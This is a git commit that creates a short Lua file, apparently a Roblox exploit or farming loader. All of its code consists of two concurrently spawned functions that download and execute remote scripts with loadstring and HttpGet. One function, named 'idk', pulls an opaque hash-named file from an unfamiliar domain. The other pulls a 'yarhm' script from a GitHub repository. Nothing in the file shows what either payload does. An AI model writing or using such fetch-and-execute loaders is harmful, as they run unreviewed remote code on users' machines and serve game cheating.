e75fee5580b10b10cfbf34e08e41154cb03d6125
Joystickplaysscript <austinejames2002@gmail.com>
2024-12-27 07:26:03 +0800

    Create Yarhm.lua

---
+++ Yarhm.lua
@@ -0,0 +1,9 @@
+local function idk()
+    loadstring(game:HttpGet("https://egorikusa.space/f0195a5cabd088c6c4836656.lua", true))()
+end
+local function farm()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua", true))()
+end
+
+task.spawn(idk)
+task.spawn(farm)
